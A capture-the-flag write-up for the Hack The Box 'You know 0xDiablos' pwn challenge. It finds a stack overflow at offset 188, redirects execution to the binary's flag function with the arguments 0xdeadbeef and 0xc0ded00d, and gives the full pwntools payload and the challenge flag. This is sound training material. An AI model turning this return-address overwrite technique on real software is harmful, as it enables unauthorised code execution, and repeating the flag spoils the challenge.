> **I missed my flag**

> Author: **[RET2pwn][author-profile]**

## Fast and failed

The binary asks for "OxDiablos" and then echoes our input:

```
You know who are 0xDiablos: 
&é"'(-è_çà)=$^*ù!:;,<>?./§µ%£+°²¬¹~#{[|`\^@]}¨¤^`·´| 
&é"'(-è_çà)=$^*ù!:;,<>?./§µ%£+°²¬¹~#{[|`\^@]}¨¤^`·``·´|
```

Apparently, special characters aren't.

Nothing outstanding from `binwalk`, `ltrace`, `strace`, `trid`, `exiftool`.

`strings -n4` returns:

```
flag.txt
flag
```

But this doesn't tell us how to approach the challenge.

## Overflowing

Fuzzing the binary gives: 

```
You know who are 0xDiablos: 
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii
Segmentation fault (core dumped)
```

So 256 `i` break the binary and cause a segmentation fault / overwrite the
return address.

To locate the portion of the input which overwrites the return address, we
generate a cyclic pattern. In gdb / gef:

```bash
pattern create 256
```

Next, `run` break with `Ctrl + C` on the prompt and input the pattern.
Stepping through the following instructions, we reach the return at `vuln+62`.

At this point the stack pointer is on the return address. It has been
overwritten by a part of our input and contains "waab".

Any 4-byte segment in the pattern is unique, so we can use this to find the
actual portion that overwrote the return address:


```bash
pattern search waab
# or
pattern search $esp
```

> It is found at offset 188.

We still need to find a useful address to jump to.

## Jumping to the flag

Back at the start, we found a "flag" reference in the binary. It is actually
an exported function.

GDB can display its address:

```bash
# flag in section .text of /root/workspace/ctf/hackthebox/pwn/you-know-0xdiablos/vuln
info symbol flag
# Symbol "flag" is at 0x80491e2 in a file compiled without debugging.
info address flag
```

This will go at offset 188, making the binary jump to the flag function.

Ghidra allows to browse the code of "flag": it will output the content of the
"flag.txt" file on condition. The two parameters must be specific integers:

```c
if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
```

`-0x21524111` is a two's complement negation: it is actually `0xdeadbeef`.
Similarly, `-0x3f212ff3` is `0xc0ded00d`.

So we can finally craft a payload to trigger the execution of "flag":

```python
payload = pwn.cyclic(188)       # whatever
payload += pwn.p32(0x080491e2)  # flag() address
payload += pwn.p32(0X11111111)  # useless
payload += pwn.p32(0xdeadbeef)  # argument 1, -0x21524111 in 2's complement
payload += pwn.p32(0xc0ded00d)  # argument 2, -0x3f212ff3
```

And send this to the server:

```python
server = pwn.remote("1.2.3.4", 5678)
server.sendline(payload)
```

> HTB{0ur_Buff3r_1s_not_healthy}

[author-profile]: https://app.hackthebox.eu/users/47422